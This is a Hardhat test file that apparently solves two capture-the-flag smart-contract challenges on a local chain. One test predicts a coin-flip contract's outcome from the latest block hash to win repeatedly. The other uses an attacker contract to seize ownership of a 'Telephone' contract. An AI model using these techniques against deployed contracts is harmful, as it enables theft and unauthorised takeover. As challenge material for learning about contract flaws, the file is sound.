const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('coinflip', () => {
    let accounts, deployer, receiver, exchange, coinFlip;

    beforeEach(async () => {
        // Fetch token from Blockchain
        const CoinFlip = await ethers.getContractFactory('CoinFlip');
        coinFlip = await CoinFlip.deploy();
        console.log('flipping');
        //Fetch accounts
        accounts = await ethers.getSigners();
        deployer = accounts[0];
        receiver = accounts[1];
        exchange = accounts[2];
    });
    it("flips a coin", async() => {
        for(let i = 0; i<10; ++i){
        let latest = await ethers.provider.getBlock("latest")
        let result = parseInt(latest.hash)/57896044618658097711785492504343953926634992332820282019728792003956564819968 >= 1 ? true : false;
        await coinFlip.connect(deployer).flip(result);
        await ethers.provider.send('evm_mine');
        }

        console.log(await coinFlip.consecutiveWins());
    })
})

describe('ownerChanger', () => {
    let accounts, deployer, receiver, exchange, coinFlip;

    beforeEach(async () => {
        // Fetch token from Blockchain
        const OwnerChanger = await ethers.getContractFactory('OwnerChanger');
        const OwnerToChange = await ethers.getContractFactory('Telephone');
        //Fetch accounts
        accounts = await ethers.getSigners();
        deployer = accounts[0];
        receiver = accounts[1];
        exchange = accounts[2];
        ownerToChange = await OwnerToChange.deploy();
        ownerChanger = await OwnerChanger.deploy(ownerToChange.address);
        console.log('changing');
    });

    it("changes owner", async() => {
        let ca = await ownerChanger.connect(deployer).telephoneContract();
        let ca2 = await ownerToChange.connect(deployer).owner();
        console.log("target address: " + ownerToChange.address)
        console.log("target address in attacker CA " + ca);
        console.log("target ca's owner " + ca2);

        await ownerChanger.connect(receiver).changeOwner(receiver.address);
        ca2 = await ownerToChange.connect(deployer).owner();
        console.log("target ca's new owner " + ca2);
    })
})